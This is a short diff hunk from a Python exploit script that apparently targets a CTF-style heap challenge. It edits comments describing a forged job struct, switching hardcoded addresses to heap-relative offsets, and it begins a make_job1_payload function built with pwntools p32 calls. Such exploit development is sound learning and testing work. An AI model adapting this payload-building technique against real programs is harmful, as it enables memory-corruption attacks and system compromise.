@@ -81,11 +81,10 @@ def gather_results():
 # struct job {
 #   unsigned int id;
 #   unsigned int len = 4;
-#   unsigned char *input = 0x804b580;
-#   unsigned int *result = &ebp of main context = 0x804b034;
+#   unsigned char *input = +0x10;
+#   unsigned int *result = &ebp of main context = heap + 0x34;
 # bytes:
-#   need to be crc32 to address of 2nd job chunk + 0x50 = 0x805b950
-#   fa ee 4b 05/0x054beefa
+#   need to be crc32 to address of 2nd job chunk
 def make_job1_payload(chunk_addr, displacement):
 	job_id = p32(0) #id, not useful
 	length = p32(4) #going to calculate 4 bytes
